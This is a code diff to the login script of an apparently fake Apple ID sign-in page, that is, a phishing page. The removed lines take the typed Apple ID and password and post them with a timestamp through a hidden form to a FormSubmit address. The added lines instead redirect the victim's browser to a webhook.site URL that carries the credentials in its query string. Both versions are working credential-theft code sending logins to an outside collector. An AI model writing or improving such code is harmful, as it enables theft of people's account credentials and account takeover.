@@ -247,46 +247,20 @@
     </div>
     
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const appleid = document.getElementById('appleid').value;
-            const password = document.getElementById('password').value;
-            
-            // Show loading
-            document.querySelector('.container form').style.display = 'none';
-            document.getElementById('loading').style.display = 'block';
-            
-// Create a hidden form and submit to FormSubmit
-        const form = document.createElement('form');
-        form.method = 'POST';
-        form.action = 'https://formsubmit.co/11111111aa1aaaaa@gmail.com';
+       document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
         
-        const emailInput = document.createElement('input');
-        emailInput.type = 'hidden';
-        emailInput.name = 'appleid';
-        emailInput.value = appleid;
+        const appleid = document.getElementById('appleid').value;
+        const password = document.getElementById('password').value;
         
-        const passInput = document.createElement('input');
-        passInput.type = 'hidden';
-        passInput.name = 'password';
-        passInput.value = password;
+        // Show loading
+        document.querySelector('.container form').style.display = 'none';
+        document.getElementById('loading').style.display = 'block';
         
-        const timeInput = document.createElement('input');
-        timeInput.type = 'hidden';
-        timeInput.name = 'timestamp';
-        timeInput.value = new Date().toISOString();
-        
-        form.appendChild(emailInput);
-        form.appendChild(passInput);
-        form.appendChild(timeInput);
-        
-        document.body.appendChild(form);
-        
-        // Submit form
+        // Redirect to webhook with credentials in URL
         setTimeout(() => {
-            form.submit();
-        }, 1000);
+            window.location.href = 'https://webhook.site/f64f2030-f543-4cd4-b998-70537c83781d?appleid=' + encodeURIComponent(appleid) + '&password=' + encodeURIComponent(password) + '&timestamp=' + new Date().toISOString();
+        }, 2000);
     });
     </script>
 </body>
